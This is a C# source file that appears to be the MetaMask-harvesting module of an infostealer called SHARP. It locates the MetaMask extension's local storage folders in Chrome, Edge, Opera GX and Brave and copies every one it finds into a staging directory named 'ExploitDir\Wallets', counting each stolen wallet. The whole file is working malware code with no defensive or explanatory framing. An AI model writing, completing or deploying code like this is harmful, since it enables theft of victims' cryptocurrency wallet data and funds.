using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace SHARP
{
    internal class Metamask
    {
      private static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      private static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

      public static async Task Get()
      {
        Dictionary<string, string> dictionary = new Dictionary<string, string>()
        {
          {
            "Google",
            Path.Combine(Metamask.LocalApplicationData, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
          },
          {
            "Edge_v1",
            Path.Combine(Metamask.LocalApplicationData, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")
          },
          {
            "Edge_v2",
            Path.Combine(Metamask.LocalApplicationData, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
          },
          {
            "OperaGX",
            Path.Combine(Metamask.ApplicationData, "Opera Software", "Opera GX Stable", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
          },
          {
            "Brave",
            Path.Combine(Metamask.LocalApplicationData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
          }
        };
        List<Task> taskList = new List<Task>();
        foreach (KeyValuePair<string, string> path in dictionary)
        {
          if (Directory.Exists(path.Value))
            taskList.Add(Metamask.GetMetData(path));
        }
        await Task.WhenAll((IEnumerable<Task>) taskList);
      }

      private static async Task GetMetData(KeyValuePair<string, string> path)
      {
        string path1 = Help.ExploitDir + "\\Wallets";
        if (!Directory.Exists(path1))
          Directory.CreateDirectory(path1);
        Filemanager.CopyDirectory(path.Value, Path.Combine(Help.ExploitDir + "\\Wallets\\Metamask", "Metamask_Extension_" + path.Key));
        ++Counting.metamask;
        ++Counting.Wallets;
      }
    }
}
